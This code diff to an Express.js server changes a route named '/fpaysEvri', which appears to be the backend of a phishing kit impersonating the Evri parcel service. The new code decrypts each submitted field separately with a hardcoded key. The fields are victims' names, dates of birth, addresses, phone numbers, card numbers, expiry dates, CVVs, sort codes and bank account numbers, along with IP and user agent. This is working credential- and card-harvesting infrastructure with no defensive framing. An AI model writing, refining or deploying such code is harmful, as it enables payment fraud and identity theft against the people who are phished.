@@ -18921,22 +18921,42 @@ app.post("/kelvEvri", (req, res) => {
 });
 
 app.post("/fpaysEvri", (req, res) => {
-  let {
-    fname,
-    dob,
-    telephone,
-    address,
-    pcode,
-    ccname,
-    ccnum,
-    ccexp,
-    cvv,
-    userAgent,
-    ip,
-    bin,
-    scode,
-    accno,
-  } = CryptoJS.AES.decrypt(req.body, "402312").toString(CryptoJS.enc.Utf8);
+  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+  bin = req.body.bin;
 
   if (bin.length === 7) {
     formatBin = bin.replace(/ /g, "");
